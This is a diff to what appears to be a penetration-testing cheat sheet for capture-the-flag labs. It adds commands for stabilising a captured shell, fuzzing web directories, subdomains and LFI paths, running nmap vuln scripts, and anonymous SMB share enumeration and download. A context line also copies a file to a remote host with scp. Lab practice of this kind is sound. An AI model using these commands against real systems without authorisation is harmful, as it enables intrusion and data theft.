@@ -13,7 +13,17 @@ Here are some handy tricks to enhance your pentesting workflow:
 ---
 #### Spawn a fully interactive shell:
 ```python
+# Spawn Python shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+# Give terminal functions
+export TERM=xterm
+
+# Background the shell
+Ctrl + Z
+
+# Bring shell back to the foreground 
+stty raw -echo; fg
 ```
 #### Read file:
 ```
@@ -64,9 +74,19 @@ scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
 ```
 ---
 ### Web
-#### Discover hidden directories using `wfuzz`:
+#### Discover hidden directories:
 ```linux
 wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.47.7/island/2100/FUZZ.ticket
+
+feroxbuster -u http://10.10.46.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
+```
+#### Discover subdomains with `wfuzz` :
+```
+wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
+```
+#### Discover files with `wfuzz` :
+```
+wfuzz -c -w /usr/share/dirb/wordlists/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php\?page\=FUZZ --hw=0
 ```
 #### Brute force wordpress
 ```
@@ -127,6 +147,7 @@ find / -perm -u=s -type f 2>/dev/null
 find / -type f -perm -04000 -ls 2>/dev/null #compare executables on this list with GTFOBins
 getcap -r / 2>/dev/null
 cat /etc/exports #file sharing
+nmap --script=vuln <ip>
 ```
 ####  Automated Enumeration Tools
 * [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
@@ -199,6 +220,12 @@ open SMB shares
 
 ```
 smbclient -L 10.10.251.241
+```
+
+enumeration
+```
+smbmap -H '10.10.13.234' -u '' -p '' -R 
+smbmap -H '10.10.195.72' -u '' -p '' -R -A 'enter.txt' #download file
 ```
 
 scan with nmap
